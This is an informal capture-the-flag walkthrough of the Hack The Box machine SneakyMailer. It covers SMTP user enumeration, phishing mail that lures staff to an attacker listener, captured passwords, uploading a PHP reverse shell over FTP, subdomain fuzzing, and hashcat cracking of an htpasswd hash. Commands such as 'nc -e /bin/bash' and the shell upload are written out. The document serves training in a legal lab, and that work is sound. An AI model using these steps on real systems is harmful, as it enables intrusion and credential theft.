add sneakycorp.htb to /etc/hosts with its ip address

verify emails exist using the port using:

```
nc 10.10.10.197 25
```
and then

```
vrfy laelgreer@sneakymailer.htb

```

try smtp enumeration using this: https://www.hackingarticles.in/4-ways-smtp-enumeration/ and fail
try sending mails using this syntax and try to get a reverse shell using ```nc -e /bin/bash yourip port (nc -vlp on the attacker side) ```

reverse shell doesnt work but putting nc on port 80 would make it a simple http request, and u can send it via browser and try sending it mails,
test it on ur local by oopening a browser and typing http://localhost


for sending emails use 
https://www.wikihow.com/Send-Email-Using-Telnet


tried the following and failed
```
nc 10.10.10.197 25
220 debian ESMTP Postfix (Debian/GNU)
MAIL FROM: laelgreer@sneakymailer.htb
250 2.1.0 Ok
RCPT TO: glorialittle@sneakymailer.htb
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
http://10.10.14.117

<CR><LF>.<CR><LF>

.
250 2.0.0 Ok: queued as E99702470F
quit
221 2.0.0 Bye
```


to see all available commnad use ehlo command at port 25
```

ehlo
501 Syntax: EHLO hostname
ehlo 10.10.10.197
250-debian
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
```


https://linux.die.net/man/1/swaks
after that try using swaks and pray to science that all will be good.

using swaks like
```
swaks -to paulbyrd@sneakymailer.htb -server 10.10.10.197 -from glorialittle@sneakymailer.htb -body "http://10.10.14.117/"
```
didnt work the out put was crap


we finally created a custom shel script as in mailer.sh

run that with the cla as cewlmails.txt and  listen on port 80 with nc using ```nc -vlp 80```


once the script finishes u will get the following on the listener ``` firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt```

which can be edited as:
```
 firstName=Paul
&lastName=Byrd&
email=paulbyrd%40sneakymailer.htb
& password = %5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
& rpassword = %5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
```
which on url decoding gives "
```
^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```


using this password i tried creating a mail client as sneapy.py but it didint work and i was told authentication was failed
i checked a few forums andit mentioned evolution hence i am trying that
 and it worked


found this in the sent items
"
llo administrator, I want to change this password for the developer account
 
Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
 
Please notify me when you do it"

looks like this is the password will try on ftb and ssh

it doesnt work on ssh but i can sign in to ftp
 via:
``` ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:kali): developer
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Oct 02 11:01 dev
226 Directory send OK.
ftp> tp 10.10.10.197
?Invalid command
ftp> Connected to 10.10.10.197.
?Invalid command
ftp> 220 (vsFTPd 3.0.3)
?Invalid command
ftp> Name (10.10.10.197:kali): developer
?Invalid command
```


Then i downnloaded the reverse shell php from pentest monkey from https://github.com/pentestmonkey/php-reverse-shell

after logging in ftp u can put it to ftp using the following commands after logging in:
```
cd dev
put php-reverse-shell.php
```

lil note: https://github.com/danielmiessler/SecLists--> install this using ```apt install seclists```

couldnt find it in the subdirectories forum mentions subdomain, in seclists subdomains can be found at "/usr/share/seclists/Discovery/DNS/"  so check subdomains using the following command
```
wfuzz -c -f subdomainSneakyMailer.log -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -u 'http://10.10.10.197/' -H 'Host:FUZZ.sneakycorp.htb' -t 50 --hc 404,301

```
u will find the dev subdowmain check the logs in subdomainSneakyMailer.log 

now change the /etc/hosts files and put the subdomain and remove the previous entry meaning now ur hosts file must contains:
``` 10.10.10.197 dev.sneakycorp.htb
```
once updated put the reverseshell.php using ftp

use nc to open the port listening via ```nc -vlp 1234 ```
now go to the link on browser that is ```dev.sneakycorp.htb/reverseshell.php```
 ur netcat will give u a shell for www-data, with that go to ```/var/www/pypi.sneakycorp.htb```
u will find a ".htpasswd" file there with the following content ```pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```
on identifying the hash using hashid tool we find the following: 
``` hashid -m '$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/'
Analyzing '$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/'                                                                                                                                                                                          
[+] MD5(APR) [Hashcat Mode: 1600]                                                                                                                                                                                                          
[+] Apache MD5 [Hashcat Mode: 1600]
```
PS: -m is for the output of hashcat
on using rockyou wordlist  with hashcat we find the following:
```
hashcat -m 1600 -a 0 --force -o cracked.txt target_hashes.txt /usr/share/wordlists/rockyou.txt
User: $apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui
password: soufianeelhaoui
```


